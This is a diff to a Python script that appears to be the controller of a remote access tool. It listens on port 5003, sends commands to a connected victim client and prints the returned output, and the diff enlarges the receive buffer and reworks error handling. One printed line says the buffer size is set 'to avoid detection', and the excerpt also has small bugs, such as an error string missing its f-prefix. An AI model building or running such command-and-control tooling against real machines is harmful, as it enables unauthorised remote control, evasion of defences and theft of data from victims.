@@ -241,7 +241,7 @@ def CheckForUpdates(repo_path='.', branch='main', version_file='version.txt'):
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
-BUFFER_SIZE = 1024 * 1024  # 128KB
+BUFFER_SIZE = 5 * 1024 * 1024  # 5MB for ouput buffer size, feel free to increase
 
 # Start HTTP Server in the Background
 http_server_thread = threading.Thread(target=start_http_server, daemon=True)
@@ -325,7 +325,7 @@ while True:
                         continue
                     SplitedCMD = cmd.split()
                     if SplitedCMD[0].lower() == "type":
-                        print("[*] The Buffer size is Set to 1 MB to avoid detection. If you want to see larger files use the 'download' command.")
+                        print("[*] The Buffer size is Set to 5 MB to avoid detection. If you want to see larger files use the 'download' command.")
                     if cmd.lower() == "help":
                         for i in HelpList:
                             print(i)
@@ -336,18 +336,18 @@ while True:
                         start_file_server_in_thread()
                         continue
                     client_socket.send(cmd.encode())
-                    try:
-                        output = client_socket.recv(BUFFER_SIZE).decode()
-                    except ValueError as e:
-                        if "not enough values to unpack" in str(e):
-                            output = "[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file."
-                    except Exception as e:
-                        output = "[!] Error occurred while receiving data: {e}"
+                    output = client_socket.recv(BUFFER_SIZE).decode()
                     
                     # Send exit before exiting to ensure the client is also closed
                     if cmd.lower() == "exit":
                         break
-                    results, cwd = output.split(SEPARATOR)
+                    try:
+                        results, cwd = output.split(SEPARATOR)
+                    except ValueError as e:
+                        if "not enough values to unpack" in str(e):
+                            results = "[E] The output received from the client is most likely to long use '-f' flag at the end of the command to save the output to a file."
+                    except Exception as e:
+                        results = "[!] Error occurred while receiving data: {e}"
                     print(results)
                 break
             except socket.timeout:
